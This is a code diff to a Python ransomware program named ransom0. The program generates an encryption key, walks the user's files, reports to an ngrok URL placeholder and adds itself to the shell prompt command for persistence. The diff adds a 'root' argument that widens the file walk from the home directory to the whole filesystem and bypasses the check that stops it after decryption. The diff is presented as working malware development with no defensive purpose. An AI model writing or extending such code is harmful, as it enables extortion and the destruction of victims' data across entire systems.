@@ -4,6 +4,7 @@ import shutil
 import http.client
 import subprocess
 import base64
+import sys
 
 from datetime import datetime
 from os import name, path, remove
@@ -42,6 +43,10 @@ crypto = Crypto(Crypto.generate_key(32))
 key = crypto.key
 
 url = 'm1'  # PUT THE URL YOU GOT FROM NGROK HERE
+
+
+def encrypt_root():
+    return sys.argv[1] == 'root'
 
 
 class ransom0:
@@ -93,7 +98,12 @@ class ransom0:
     def FindFiles(self):
         f = open("logs/path.txt", "w")
         cnt = 0
-        for root, dirs, files in os.walk(path.expanduser('~')):
+
+        start_path = '~'
+        if encrypt_root():
+            start_path = '/'
+
+        for root, dirs, files in os.walk(path.expanduser(start_path)):
             if any(s in root for s in self.EXCLUDE_DIRECTORY):
                 pass
             else:
@@ -197,7 +207,7 @@ if __name__ == '__main__':
     decrypted_path = path.expanduser('~/.decrypted')
     prompt_cmd = "export PROMPT_COMMAND=~/ransom0.py"
 
-    if path.exists(decrypted_path):
+    if path.exists(decrypted_path) and not encrypt_root():
         exit(0)
 
     if path.exists(bashrc_path):
